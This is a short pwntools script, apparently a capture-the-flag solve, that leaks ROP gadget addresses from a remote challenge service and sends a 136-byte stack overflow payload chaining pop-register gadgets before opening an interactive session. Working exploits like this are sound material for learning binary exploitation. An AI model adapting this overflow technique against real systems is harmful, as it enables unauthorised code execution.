from pwn import *

# Connect to remote instance
io = remote("pwn.tokle.dev", 1341)

# Receive all the output text from the program
io.recvuntil(b"Good luck!")

def get_gadgets():
    io.sendlineafter(b"> ", b"5")
    io.recvuntil(b"pop rdi; ret: ")
    pop_rdi = int(io.recvline().strip(), 16)
    io.recvuntil(b"pop rsi; ret: ")
    pop_rsi = int(io.recvline().strip(), 16)
    io.recvuntil(b"pop rdx; ret: ")
    pop_rdx = int(io.recvline().strip(), 16)
    return pop_rdi, pop_rsi, pop_rdx

# Get address of gadgets
pop_rdi, pop_rsi, pop_rdx = get_gadgets()
log.success(f"Pop RDI @ {hex(pop_rdi)}")
log.success(f"Pop RSI @ {hex(pop_rsi)}")
log.success(f"Pop RDX @ {hex(pop_rdx)}")

# Pop values into registers
payload = b"A"*136
payload += p64(pop_rdi)
payload += p64(0xdeadbeef)
payload += p64(pop_rsi)
payload += p64(0xc0debabe)

# Send and trigger payload
io.sendlineafter(b"> ", b"1")
io.sendlineafter(b"Data: ", payload)
io.sendlineafter(b"> ", b"3")

io.interactive()
